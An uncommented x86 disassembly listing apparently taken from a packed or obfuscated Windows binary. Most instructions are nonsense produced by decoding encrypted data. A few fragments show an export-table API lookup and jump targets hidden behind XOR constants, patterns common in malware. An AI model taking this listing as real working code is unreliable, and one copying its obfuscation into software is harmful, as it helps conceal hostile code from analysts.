  40fb6d:	push   ecx
  40fb6e:	(bad)  
  40fb6f:	add    bl,BYTE PTR [edi-0xe772aed]
  40fb75:	icebp  
  40fb76:	or     esi,DWORD PTR [ecx]
  40fb78:	repnz cli 
  40fb7a:	mov    edx,0x68d61385
  40fb7f:	sub    ebx,DWORD PTR [eax-0x1031c1c4]
  40fb85:	push   eax
  40fb86:	mov    ebx,0x5d72d309
  40fb8b:	sub    bh,BYTE PTR [ecx]
  40fb8d:	sub    al,0x96
  40fb8f:	jg     0x40fb79
  40fb91:	mov    edi,0x698faf61
  40fb96:	add    BYTE PTR [eax],dl
  40fb98:	test   DWORD PTR [edi-0x5a],eax
  40fb9b:	in     al,dx
  40fb9c:	pop    esp
  40fb9d:	jbe    0x40fbfe
  40fb9f:	dec    ecx
  40fba0:	jb     0x40fb3f
  40fba2:	cli    
  40fba3:	(bad)  
  40fba5:	push   edi
  40fba6:	fdiv   DWORD PTR [ebx-0x50]
  40fba9:	mov    eax,ds:0x3840f7c6
  40fbae:	or     esp,esi
  40fbb0:	out    dx,al
  40fbb1:	pop    esp
  40fbb2:	inc    edi
  40fbb3:	idiv   DWORD PTR [esi+ecx*4+0x4a]
  40fbb7:	in     al,dx
  40fbb8:	cmp    BYTE PTR ds:0xcc11a3a7,bl
  40fbbe:	repnz inc ebx
  40fbc0:	and    al,BYTE PTR [eax*8+0x34b6b8f8]
  40fbc7:	(bad)  
  40fbc9:	push   es
  40fbca:	mov    esp,0x3f9f794c
  40fbcf:	dec    eax
  40fbd0:	xor    DWORD PTR [edi+0x1a9d70ca],0x55
  40fbd7:	or     esi,ebx
  40fbd9:	daa    
  40fbda:	jle    0x40fc35
  40fbdc:	xchg   ecx,eax
  40fbdd:	(bad)  
  40fbde:	(bad)
  40fbe3:	loope  0x40fbda
  40fbe5:	jbe    0x40fc53
  40fbe7:	add    eax,ecx
  40fbe9:	mov    ebx,0xf0e6c999
  40fbee:	xchg   esp,eax
  40fbef:	xchg   esp,eax
  40fbf0:	sbb    esi,esi
  40fbf2:	popf   
  40fbf3:	mov    ds:0x84bc0215,al
  40fbf8:	push   cs
  40fbf9:	pop    ss
  40fbfa:	fs retf 0xa17c
  40fbfe:	adc    DWORD PTR [eax-0x708a91cd],ebp
  40fc04:	and    al,0xec
  40fc06:	jmp    0x5e6a:0xad7f5aea
  40fc0d:	mov    ecx,0x4d087012
  40fc12:	fldcw  WORD PTR [edi+0x5f]
  40fc15:	in     al,dx
  40fc16:	sub    dl,BYTE PTR [edx-0x406b84d8]
  40fc1c:	sbb    BYTE PTR [ebx],cl
  40fc1e:	rcl    DWORD PTR [edx+ecx*1-0x4eb42d81],cl
  40fc25:	inc    ecx
  40fc26:	xlat   BYTE PTR ds:[ebx]
  40fc27:	sub    cl,dh
  40fc29:	pop    ebp
  40fc2a:	pop    ebp
  40fc2b:	sub    eax,0xd598e5d9
  40fc30:	(bad)  
  40fc31:	and    BYTE PTR [eax],dl
  40fc33:	aaa    
  40fc34:	or     ch,bh
  40fc36:	dec    esp
  40fc37:	and    ah,BYTE PTR [ebx]
  40fc39:	out    0x32,eax
  40fc3b:	push   esi
  40fc3c:	pop    ds
  40fc3d:	ins    BYTE PTR es:[edi],dx
  40fc3e:	ret    0xfde3
  40fc41:	jns    0x40fc9c
  40fc43:	loope  0x40fc40
  40fc45:	and    eax,0x63bf2396
  40fc4a:	mov    bl,0x69
  40fc4c:	fnstenv [edx+0x12]
  40fc4f:	xchg   ebp,eax
  40fc50:	sbb    ecx,DWORD PTR [ebx+0x10]
  40fc53:	sbb    eax,0x281223e6
  40fc58:	ficom  WORD PTR [edi-0x3efc2b3d]
  40fc5e:	sub    bl,0x6
  40fc61:	mov    ecx,0x1d26af7a
  40fc66:	and    edi,DWORD PTR [edx]
  40fc68:	inc    eax
  40fc69:	xchg   edi,eax
  40fc6a:	or     edi,DWORD PTR [eax]
  40fc6c:	test   DWORD PTR [ebx+edx*8],ebp
  40fc6f:	cmp    ecx,DWORD PTR [esi]
  40fc71:	add    ecx,DWORD PTR [ecx+0x30]
  40fc74:	push   0xffffffd9
  40fc76:	test   BYTE PTR [ebx-0x3b29d252],ah
  40fc7c:	push   ds
  40fc7d:	ins    BYTE PTR es:[edi],dx
  40fc7e:	mov    DWORD PTR [esi-0x41f25eab],eax
  40fc84:	(bad)  
  40fc85:	jne    0x40fcc4
  40fc87:	arpl   cx,cx
  40fc89:	ret    
  40fc8a:	push   0x9a50e039
  40fc8f:	pop    es
  40fc90:	retf   
  40fc91:	jg     0x40fc73
  40fc93:	xor    ecx,esp
  40fc95:	ins    BYTE PTR es:[edi],dx
  40fc96:	stc    
  40fc97:	lds    ebp,FWORD PTR [eax-0x30]
  40fc9a:	or     dl,bl
  40fc9c:	je     0x40fce5
  40fc9e:	sbb    eax,0xa9f84cb1
  40fca3:	pop    esi
  40fca4:	mov    bh,0x78
  40fca6:	dec    eax
  40fca7:	pushf  
  40fca8:	inc    eax
  40fca9:	inc    esp
  40fcaa:	dec    ecx
  40fcab:	sub    dh,ah
  40fcad:	fdivr  DWORD PTR [ebx-0x2c]
  40fcb0:	push   es
  40fcb1:	inc    ebp
  40fcb2:	sahf   
  40fcb3:	dec    ebx
  40fcb4:	mov    edx,0x879d3a2b
  40fcb9:	xor    eax,0xce5d7c3a
  40fcbe:	xor    eax,0x9f321941
  40fcc3:	mov    gs,WORD PTR [ebx+0x3e]
  40fcc6:	dec    ecx
  40fcc7:	dec    edx
  40fcc8:	cmp    eax,0x16e4e29b
  40fccd:	and    DWORD PTR [edi+0x34],esi
  40fcd0:	push   cs
  40fcd1:	push   es
  40fcd2:	ins    BYTE PTR es:[edi],dx
  40fcd3:	inc    ebp
  40fcd4:	lods   al,BYTE PTR ds:[esi]
  40fcd5:	hlt    
  40fcd6:	je     0x40fd16
  40fcd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcd9:	pop    esi
  40fcda:	and    al,0xd
  40fcdc:	gs in  al,dx
  40fcde:	rol    DWORD PTR [ebp+ebp*2+0x3],cl
  40fce2:	cwde   
  40fce3:	mov    dl,0xa4
  40fce5:	pushf  
  40fce6:	jmp    0x40fd65
  40fce8:	lods   al,BYTE PTR ds:[esi]
  40fce9:	or     edi,DWORD PTR [edx-0x7c]
  40fcec:	dec    ebx
  40fced:	jmp    0x499d:0x55c66af9
  40fcf4:	fiadd  DWORD PTR [eax+esi*8]
  40fcf7:	dec    eax
  40fcf8:	ret    0x7da5
  40fcfb:	(bad)  
  40fcfc:	mov    ds:0x58060c90,al
  40fd01:	xchg   ecx,eax
  40fd02:	(bad)  
  40fd03:	fsubr  QWORD PTR [ecx-0x76]
  40fd06:	lock in eax,0x71
  40fd09:	stos   DWORD PTR es:[edi],eax
  40fd0a:	out    dx,al
  40fd0b:	sar    DWORD PTR [edx+edx*2-0x7b83c1a],1
  40fd12:	sub    DWORD PTR [eax],eax
  40fd14:	pop    ecx
  40fd15:	mov    DWORD PTR [esi],ecx
  40fd17:	pushf  
  40fd18:	fs xchg ebp,eax
  40fd1a:	xor    eax,0x7510855
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	sbb    cl,BYTE PTR [edi-0x48271f90]
  40fd7a:	jo     0x40fdec
  40fd7c:	dec    ecx
  40fd7d:	jge    0x40fdef
  40fd7f:	jo     0x40fd62
  40fd81:	lock fcmovnbe st,st(6)
  40fd84:	pop    ebp
  40fd85:	fcmovb st,st(7)
  40fd87:	xchg   ebp,eax
  40fd88:	pop    ebx
  40fd89:	jle    0x40fdec
  40fd8b:	cmp    al,0x99
  40fd8d:	or     al,0x3f
  40fd8f:	rol    BYTE PTR [edx-0xa],1
  40fd92:	dec    esp
  40fd93:	xor    ch,0xa5
  40fd96:	or     DWORD PTR [ecx],esp
  40fd98:	mov    dh,0xa0
  40fd9a:	jb     0x40fdee
  40fd9c:	pop    eax
  40fd9d:	enter  0x678e,0xf7
  40fda1:	shl    BYTE PTR [esi+0xa],cl
  40fda4:	lock fldcw WORD PTR [ebp-0x7e]
  40fda8:	cmp    BYTE PTR [edi-0x66c567f8],dh
  40fdae:	inc    esp
  40fdaf:	mov    dl,0x12
  40fdb1:	push   esp
  40fdb2:	je     0x40fe0f
  40fdb4:	out    0xce,al
  40fdb6:	in     eax,0x7
  40fdb8:	xlat   BYTE PTR ds:[ebx]
  40fdb9:	dec    edi
  40fdba:	ja     0x40fd47
  40fdbc:	imul   edi,eax,0x78a5e28e
  40fdc2:	sub    eax,0x6b
  40fdc5:	dec    eax
  40fdc6:	jb     0x40fdc7
  40fdc8:	pop    ebx
  40fdc9:	mov    ebx,0xe35d83cd
  40fdce:	or     esp,ebx
  40fdd0:	add    BYTE PTR [ecx+0x71],bh
  40fdd3:	mov    ds:0xbcbffec3,eax
  40fdd8:	jmp    0x371a:0x22ee34ce
  40fddf:	jecxz  0x40fd9f
  40fde1:	cwde   
  40fde2:	or     ch,BYTE PTR [esi+0x4f82defb]
  40fde8:	inc    esi
  40fde9:	ja     0x40fe42
  40fdeb:	shl    DWORD PTR [edi+esi*8-0x4de02a50],1
  40fdf2:	pop    ss
  40fdf3:	xchg   ebp,eax
  40fdf4:	repz shl DWORD PTR [esi],1
  40fdf7:	sbb    al,0x8e
  40fdf9:	dec    ebx
  40fdfa:	xchg   ecx,eax
  40fdfb:	call   0x2c60b072
  40fe00:	das    
  40fe01:	scas   eax,DWORD PTR es:[edi]
  40fe02:	fld    TBYTE PTR [ecx]
  40fe04:	jl     0x40fe65
  40fe06:	aaa    
  40fe07:	xchg   esi,eax
  40fe08:	jmp    0x53bdd06d
  40fe0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe0e:	jae    0x40fe12
  40fe10:	lods   al,BYTE PTR ds:[esi]
  40fe11:	scas   al,BYTE PTR es:[edi]
  40fe12:	dec    eax
  40fe13:	jbe    0x40fe42
  40fe15:	add    DWORD PTR [ebp-0x77],ebp
  40fe18:	dec    ecx
  40fe19:	je     0x40fe3c
  40fe1b:	add    al,0x66
  40fe1d:	test   al,0x63
  40fe1f:	lods   al,BYTE PTR ds:[esi]
  40fe20:	das    
  40fe21:	les    ecx,FWORD PTR [esi+0x6accb26d]
  40fe27:	mov    edx,0x4e1b58f4
  40fe2c:	sbb    al,0xb8
  40fe2e:	inc    ebx
  40fe2f:	inc    edx
  40fe30:	dec    esp
  40fe31:	xchg   ebp,eax
  40fe32:	ret    0x94ab
  40fe35:	out    dx,al
  40fe36:	leave  
  40fe37:	repz je 0x40fdc8
  40fe3a:	ret    
  40fe3b:	pop    ecx
  40fe3c:	hlt    
  40fe3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe3e:	out    0xea,eax
  40fe40:	push   0xb291fca8
  40fe45:	in     al,0x64
  40fe47:	inc    ebx
  40fe48:	lahf   
  40fe49:	and    DWORD PTR [edx],esi
  40fe4b:	call   0x6dad7645
  40fe50:	je     0x40fe00
  40fe52:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe54:	pop    es
  40fe55:	mov    ch,0x39
  40fe57:	les    esi,FWORD PTR [ebp+ebp*4+0x3159d11d]
  40fe5e:	mov    ebx,0x6f6eaa79
  40fe63:	and    edx,DWORD PTR [esp+edi*2+0x4c]
  40fe67:	mov    eax,ds:0x4732528b
  40fe6c:	test   eax,0x95ec418c
  40fe71:	cmp    BYTE PTR [edi+0x4c],bh
  40fe74:	scas   eax,DWORD PTR es:[edi]
  40fe75:	mov    al,0x9f
  40fe77:	jbe    0x40fe92
  40fe79:	jmp    DWORD PTR [esi-0x2376c452]
  40fe7f:	je     0x40fe1e
  40fe81:	cmp    cl,BYTE PTR [ebx+edi*1-0x4c7109f4]
  40fe88:	shl    ah,1
  40fe8a:	and    al,0xa2
  40fe8c:	daa    
  40fe8d:	add    bl,cl
  40fe8f:	add    ebx,DWORD PTR [ecx-0x7e]
  40fe92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe93:	cmp    DWORD PTR [esi],edx
  40fe95:	pop    esi
  40fe96:	ja     0x40fed1
  40fe98:	push   eax
  40fe99:	dec    esi
  40fe9a:	cs jle 0x40fe5f
  40fe9d:	dec    esp
  40fe9e:	fstp   DWORD PTR [edi]
  40fea0:	(bad)  
  40fea2:	mov    esp,0x62589b3f
  40fea7:	iret   
  40fea8:	cmc    
  40fea9:	mov    edi,0x7d18ed8f
  40feae:	or     dh,BYTE PTR [esi]
  40feb0:	out    dx,eax
  40feb1:	cmc    
  40feb2:	int3   
  40feb3:	sub    cl,BYTE PTR [edx]
  40feb5:	aam    0x75
  40feb7:	mov    al,BYTE PTR [ebx+0x8]
  40feba:	pop    ebx
  40febb:	aam    0xc1
  40febd:	loopne 0x40fe7b
  40febf:	jmp    0x5527fce7
  40fec4:	mov    BYTE PTR [edx],dh
  40fec6:	sub    esp,DWORD PTR [ecx-0x4e4bf676]
  40fecc:	and    bh,0x32
  40fecf:	popf   
  40fed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed1:	or     al,0x23
  40fed3:	lods   al,BYTE PTR ds:[esi]
  40fed4:	push   ebp
  40fed5:	mov    eax,ds:0x5a2391d2
  40feda:	(bad)
  40fedd:	lock rcl BYTE PTR [eax-0x226715c6],cl
  40fee4:	jmp    FWORD PTR [ecx-0x6f718041]
  40feea:	int    0x29
  40feec:	mov    esp,0xe07be248
  40fef1:	mov    WORD PTR [ebp+edx*1+0x6cdaa638],fs
  40fef8:	sbb    bh,BYTE PTR ds:0xe76b73ab
  40fefe:	push   edi
  40feff:	sbb    DWORD PTR [ecx+0x7022cf79],0xffffff8e
  40ff06:	pop    eax
  40ff07:	sub    BYTE PTR [eiz*2+0x49400545],0x6b
  40ff0f:	mov    ebp,0xd39ca1e
  40ff14:	push   edi
  40ff15:	mov    es,WORD PTR [edx]
  40ff17:	ins    DWORD PTR es:[edi],dx
  40ff18:	and    BYTE PTR [ebp+0x5b37d757],cl
  40ff1e:	ret    
  40ff1f:	sbb    al,0x4
  40ff21:	pop    ss
  40ff22:	shl    DWORD PTR ds:0xd194299a,cl
  40ff28:	xlat   BYTE PTR ds:[ebx]
  40ff29:	pushf  
  40ff2a:	add    BYTE PTR [edi+ecx*2-0x15ce7546],dl
  40ff31:	mov    ebx,0xfb3956c4
  40ff36:	popa   
  40ff37:	inc    ebp
  40ff38:	lds    edi,FWORD PTR [eax+0x1e]
  40ff3b:	xor    al,0x60
  40ff3d:	cmp    DWORD PTR [ebx],edx
  40ff3f:	ret    
  40ff40:	push   edi
  40ff41:	jmp    DWORD PTR [edi+ebx*8+0x6bc31a34]
  40ff48:	(bad)  
  40ff49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff4a:	or     edx,DWORD PTR [ebx-0xf322e75]
  40ff50:	das    
  40ff51:	outs   dx,DWORD PTR ds:[esi]
  40ff52:	push   ebx
  40ff53:	add    DWORD PTR [esi-0x1796c31d],eax
  40ff59:	lods   al,BYTE PTR ds:[esi]
  40ff5a:	pop    ds
  40ff5b:	adc    edi,edi
  40ff5d:	mov    al,0x60
  40ff5f:	in     eax,dx
  40ff60:	push   esi
  40ff61:	cmp    ecx,DWORD PTR [ebx-0x5f56bdb6]
  40ff67:	into   
  40ff68:	div    BYTE PTR [ebp+0x19]
  40ff6b:	outs   dx,DWORD PTR ds:[esi]
  40ff6c:	mov    bh,0xc5
  40ff6e:	test   al,dl
  40ff70:	call   0x53c57632
  40ff75:	mov    ebp,0x6de85f62
  40ff7a:	sbb    al,0xe9
  40ff7c:	je     0x40ff33
  40ff7e:	(bad)  
  40ff7f:	sub    al,0x53
  40ff81:	loopne 0x40fff7
  40ff83:	dec    ecx
  40ff84:	pop    ecx
  40ff85:	scas   eax,DWORD PTR es:[edi]
  40ff86:	fwait
  40ff87:	cli    
  40ff88:	xor    bh,ah
  40ff8a:	(bad)
  40ff8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff8e:	(bad)  
  40ff8f:	push   ss
  40ff90:	fisubr WORD PTR [esi]
  40ff92:	mov    edx,0x9a9cb4b3
  40ff97:	(bad)  
  40ff98:	(bad)  
  40ff9a:	dec    ecx
  40ff9b:	cmp    al,0x10
  40ff9d:	push   cs
  40ff9e:	outs   dx,DWORD PTR ds:[esi]
  40ff9f:	mov    ah,BYTE PTR [edi]
  40ffa1:	lock dec edi
  40ffa3:	xchg   edi,eax
  40ffa4:	in     eax,0x4
  40ffa6:	test   eax,0xd75fe2b4
  40ffab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffac:	pop    edx
  40ffad:	addr16 ds inc esp
  40ffb0:	mov    ds:0xb9fe2f85,al
  40ffb5:	bound  ebx,QWORD PTR [esi+eiz*8+0x71]
  40ffb9:	out    dx,eax
  40ffba:	inc    esi
  40ffbb:	mov    eax,ds:0xcdd137
  40ffc0:	dec    ecx
  40ffc1:	push   edx
  40ffc2:	aad    0x2
  40ffc4:	pop    esp
  40ffc5:	adc    eax,0x9ff76070
  40ffca:	push   esi
  40ffcb:	mov    dl,0xb7
  40ffcd:	jmp    0xee588a5c
  40ffd2:	shl    BYTE PTR [ecx],1
  40ffd4:	and    DWORD PTR [edx+0x1b1fa10f],esi
  40ffda:	iret   
  40ffdb:	or     eax,0xf4985ea4
  40ffe0:	stos   DWORD PTR es:[edi],eax
  40ffe1:	rol    dl,cl
  40ffe3:	fadd   st(5),st
  40ffe5:	push   ebx
  40ffe6:	in     al,dx
  40ffe7:	mov    bh,0x4a
  40ffe9:	out    0xd1,al
  40ffeb:	pop    esi
  40ffec:	ret    0x6717
  40ffef:	add    ch,BYTE PTR [eax]
  40fff1:	jle    0x410041
  40fff3:	inc    ebx
  40fff4:	push   0x2e
  40fff6:	ret    
  40fff7:	sbb    dh,BYTE PTR [ecx]
  40fff9:	ffree  st(2)
  40fffb:	mov    cl,0x20
  40fffd:	mov    ds:0x8398e204,eax
  410002:	cld    
  410003:	(bad)  
  410005:	jge    0x40ff92
  410007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410008:	addr16 dec edi
  41000a:	adc    esp,0x58633b2e
  410010:	aaa    
  410011:	int3   
  410012:	retf   0xb8d1
  410015:	mov    WORD PTR [edx+ecx*8-0x70],cs
  410019:	adc    dl,dh
  41001b:	mov    cl,0x98
  41001d:	(bad)  
  41001e:	rcl    BYTE PTR [ebp+0x268d94fa],0x1f
  410025:	ins    DWORD PTR es:[edi],dx
  410026:	cwde   
  410027:	jp     0x410062
  410029:	sub    dl,ah
  41002b:	push   esi
  41002c:	rol    BYTE PTR [eax],1
  41002e:	mov    bl,0xc7
  410030:	sti    
  410031:	pop    esp
  410032:	and    ebx,DWORD PTR [ebx]
  410034:	jmp    0x410078
  410036:	mov    edx,0xb3cb7c58
  41003b:	in     al,0xa1
  41003d:	mov    al,0x91
  41003f:	repz fdivr DWORD PTR [ecx+eax*4+0x482ee477]
  410047:	mul    BYTE PTR [edx]
  410049:	test   DWORD PTR [edi+0x45eeb79],0x13e1d996
  410053:	add    esp,ecx
  410055:	jmp    0x22f80815
  41005a:	popf   
  41005b:	pushf  
  41005c:	and    edx,DWORD PTR [edi+0x6b]
  41005f:	ins    BYTE PTR es:[edi],dx
  410060:	inc    ecx
  410061:	rcr    BYTE PTR [edi],1
  410063:	jecxz  0x410056
  410065:	xor    esi,DWORD PTR [ecx+0x721111de]
  41006b:	push   edi
  41006c:	push   ecx
  41006d:	inc    eax
  41006e:	add    ebp,DWORD PTR [ebp+0x76]
  410071:	rcr    BYTE PTR [edx-0x4a],1
  410074:	test   eax,0x835a0fdb
  410079:	mov    cl,0x17
  41007b:	jbe    0x410065
  41007d:	mul    DWORD PTR [ecx-0x4f]
  410080:	jp     0x4100df
  410082:	enter  0xc873,0xcc
  410086:	jns    0x4100ce
  410088:	xchg   esi,eax
  410089:	dec    ecx
  41008a:	in     eax,dx
  41008b:	jno    0x4100b4
  41008d:	pop    es
  41008e:	jmp    0x41003c
  410090:	(bad)  
  410092:	out    dx,al
  410093:	lahf   
  410094:	and    edi,DWORD PTR [esi]
  410096:	lods   al,BYTE PTR ds:[esi]
  410097:	test   BYTE PTR [ebp+0x251de753],ch
  41009d:	xor    ebp,DWORD PTR [eax-0x7cf3fe61]
  4100a3:	mov    si,0x5f40
  4100a7:	xchg   ebx,eax
  4100a8:	mov    es,WORD PTR [eax+eax*2+0x33]
  4100ac:	mov    dh,0x67
  4100ae:	ret    0x1bd0
  4100b1:	and    BYTE PTR [edx+0x32],dh
  4100b4:	(bad)  
  4100b5:	fs xchg ebp,eax
  4100b7:	out    0xdc,al
  4100b9:	dec    eax
  4100ba:	cmc    
  4100bb:	adc    al,0x18
  4100bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100be:	outs   dx,DWORD PTR ds:[esi]
  4100bf:	and    esi,eax
  4100c1:	xchg   edi,eax
  4100c2:	push   edi
  4100c3:	inc    ebp
  4100c4:	in     al,0x28
  4100c6:	mov    esi,0x1ca1d9b1
  4100cb:	push   eax
  4100cc:	cli    
  4100cd:	sbb    eax,0x849b1c97
  4100d2:	shl    BYTE PTR [edi-0x5a],cl
  4100d5:	adc    DWORD PTR [eax],ebx
  4100d7:	rcl    dh,cl
  4100d9:	fimul  WORD PTR [edx]
  4100db:	jge    0x41013a
  4100dd:	xor    edx,DWORD PTR [eax]
  4100df:	jae    0x4100e8
  4100e1:	and    BYTE PTR [edi],dl
  4100e3:	jb     0x41014e
  4100e5:	sub    cl,BYTE PTR [eax]
  4100e7:	int    0x91
  4100e9:	retf   0x10dc
  4100ec:	push   cs
  4100ed:	clc    
  4100ee:	out    0xe2,eax
  4100f0:	dec    ebx
  4100f1:	pop    edx
  4100f2:	call   0x163a87fe
  4100f7:	pushf  
  4100f8:	xchg   BYTE PTR [edi+0x744f66ad],ah
  4100fe:	fnstenv [ecx-0x63]
  410101:	aad    0xda
  410103:	push   ds
  410104:	mov    al,0xa9
  410106:	and    BYTE PTR [edx+0x1c],dl
  410109:	and    ch,al
  41010b:	xchg   esp,eax
  41010c:	jne    0x410095
  41010e:	jmp    0xa1372993
  410113:	xchg   edx,eax
  410114:	adc    ch,al
  410116:	xchg   BYTE PTR [esi-0x4e],dh
  410119:	mov    ds:0xa1018a37,eax
  41011e:	or     DWORD PTR [ecx-0x7e39eaec],ecx
  410124:	add    al,0x17
  410126:	in     eax,dx
  410127:	or     esp,DWORD PTR [ebx-0x327030c0]
  41012d:	ss rcr esi,cl
  410130:	adc    ebp,edi
  410132:	xchg   edi,eax
  410133:	sbb    esp,DWORD PTR [esi]
  410135:	pop    edx
  410136:	adc    al,0x96
  410138:	xor    edx,DWORD PTR [ebx-0x49]
  41013b:	push   eax
  41013c:	out    dx,al
  41013d:	lahf   
  41013e:	aas    
  41013f:	out    dx,al
  410140:	outs   dx,DWORD PTR ds:[esi]
  410141:	jae    0x4101c0
  410143:	bound  ebx,QWORD PTR [esi+0x0]
  410146:	push   ss
  410147:	ret    0x24eb
  41014a:	or     BYTE PTR [edi+ebx*8-0x2fa5fcbc],dh
  410151:	jl     0x4101a3
  410153:	cmp    ecx,esp
  410155:	(bad)  
  410156:	jg     0x410193
  410158:	enter  0x850f,0xd
  41015c:	add    BYTE PTR [eax],al
  41015e:	add    BYTE PTR [ebx+0x5535fc45],cl
  410164:	or     BYTE PTR [ecx+0x7],dl
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	mov    ds:0x31c7af40,al
  41018e:	mov    bl,0x70
  410190:	jo     0x4101db
  410192:	jge    0x410204
  410194:	jo     0x41013e
  410196:	lods   al,BYTE PTR ds:[esi]
  410197:	add    eax,ebx
  410199:	sub    edx,ebx
  41019b:	cs je  0x410158
  41019e:	sbb    BYTE PTR [ebx-0x5b],dh
  4101a1:	ret    
  4101a2:	bswap  ebx
  4101a4:	and    esi,eax
  4101a6:	aas    
  4101a7:	lock int3 
  4101a9:	cmc    
  4101aa:	pushf  
  4101ab:	pusha  
  4101ac:	add    BYTE PTR [ecx+0x6e],0x59
  4101b0:	sti    
  4101b1:	inc    esi
  4101b2:	test   al,0x42
  4101b4:	sub    bl,bh
  4101b6:	loopne 0x4101ad
  4101b8:	xchg   ebp,eax
  4101b9:	sbb    BYTE PTR [edi+edx*4],dh
  4101bc:	jg     0x410160
  4101be:	add    dh,BYTE PTR [ebx+0x79]
  4101c1:	retf   0xdd9c
  4101c4:	leave  
  4101c5:	addr16 pop ebp
  4101c7:	and    al,0x52
  4101c9:	(bad)  
  4101ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101cb:	pop    edx
  4101cc:	bnd jns 0x410231
  4101cf:	pop    ebx
  4101d0:	mov    bh,0x8e
  4101d2:	sub    al,0x81
  4101d4:	sub    eax,DWORD PTR ds:0xb568d649
  4101da:	out    0x45,eax
  4101dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101dd:	jle    0x4101c2
  4101df:	and    ebp,0xf7c87d1c
  4101e5:	or     al,0x2d
  4101e7:	and    al,0xf9
  4101e9:	add    BYTE PTR [esi+0x4c],ah
  4101ec:	rol    ebp,cl
  4101ee:	out    dx,eax
  4101ef:	add    al,0xdf
  4101f1:	mov    dl,0x60
  4101f3:	scas   al,BYTE PTR es:[edi]
  4101f4:	int3   
  4101f5:	test   BYTE PTR [ebx+0x4d76f22a],ah
  4101fb:	push   edx
  4101fc:	clc    
  4101fd:	fistp  WORD PTR [esi+0x52376cf3]
  410203:	test   DWORD PTR [ebp-0x7a6b941a],ebp
  410209:	pop    ebp
  41020a:	xchg   BYTE PTR [ebp-0x45813041],cl
  410210:	adc    BYTE PTR ds:[edx-0xa],al
  410214:	dec    ebx
  410215:	sahf   
  410216:	scas   al,BYTE PTR es:[edi]
  410217:	add    cl,BYTE PTR [edx+0x35]
  41021a:	mov    dl,0x9c
  41021c:	inc    esi
  41021d:	add    DWORD PTR [edi+0x68],esi
  410220:	shl    BYTE PTR [edx],0x8f
  410223:	das    
  410224:	jecxz  0x4101d5
  410226:	and    eax,ebx
  410228:	stos   DWORD PTR es:[edi],eax
  410229:	and    dl,BYTE PTR [ebx-0x134d9246]
  41022f:	push   cs
  410230:	jns    0x41023c
  410232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410233:	int3   
  410234:	out    dx,al
  410235:	addr16 in eax,0xd7
  410238:	ficom  DWORD PTR [ecx-0x5c38f027]
  41023e:	lock mov al,ds:0xc278608d
  410244:	mov    esp,0xf8a5e4e6
  410249:	fst    QWORD PTR [ebx-0xb]
  41024c:	pop    ds
  41024d:	in     eax,0xcf
  41024f:	sar    ebx,1
  410251:	popa   
  410252:	xchg   edx,eax
  410253:	adc    ecx,eax
  410255:	mov    gs,edi
  410257:	loope  0x410200
  410259:	cld    
  41025a:	mov    ebx,0x9d07e6a8
  41025f:	cmp    DWORD PTR [eax+0x6662a07c],edi
  410265:	push   edi
  410266:	or     DWORD PTR [edx],ecx
  410268:	sub    BYTE PTR [ebx+0x23e0627c],dh
  41026e:	cmp    al,0x45
  410270:	std    
  410271:	std    
  410272:	(bad)  
  410273:	sub    BYTE PTR [edi-0x1a],cl
  410276:	push   ecx
  410277:	add    eax,0x24b6b34a
  41027c:	push   ds
  41027d:	mov    al,ds:0xaaf48384
  410282:	dec    dl
  410284:	push   ebx
  410285:	outs   dx,DWORD PTR ds:[esi]
  410286:	cli    
  410287:	cmp    bh,dl
  410289:	mov    ecx,ecx
  41028b:	fsub   st(4),st
  41028d:	adc    eax,0xa6cd72e4
  410292:	outs   dx,DWORD PTR ds:[esi]
  410293:	push   cs
  410294:	dec    esi
  410295:	mov    esi,0x9d0e1bb3
  41029a:	fsub   st,st(7)
  41029c:	inc    esp
  41029d:	fcomp  QWORD PTR [esi+ecx*4-0x714a2ec7]
  4102a4:	sbb    ecx,DWORD PTR [eax]
  4102a6:	or     edx,ebx
  4102a8:	pop    eax
  4102a9:	pusha  
